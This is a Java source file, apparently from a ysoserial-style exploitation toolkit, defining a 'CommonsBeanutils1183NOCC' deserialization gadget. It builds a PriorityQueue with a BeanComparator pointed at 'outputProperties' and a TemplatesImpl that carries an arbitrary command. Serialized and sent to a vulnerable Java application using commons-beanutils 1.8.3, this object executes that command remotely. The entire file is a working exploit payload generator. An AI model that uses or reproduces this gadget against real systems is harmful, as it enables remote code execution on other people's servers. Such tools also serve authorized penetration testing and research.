package org.su18.ysuserial.payloads.gadgets;

import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;


import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.config.Config.POOL;
import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.insertField;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		final Object template = Gadgets.createTemplatesImpl(command);

		CtClass ctClass = POOL.get("org.apache.commons.beanutils.BeanComparator");
		insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

		Class                       beanCompareClazz = ctClass.toClass();
		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");
		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

		return queue;
	}
}
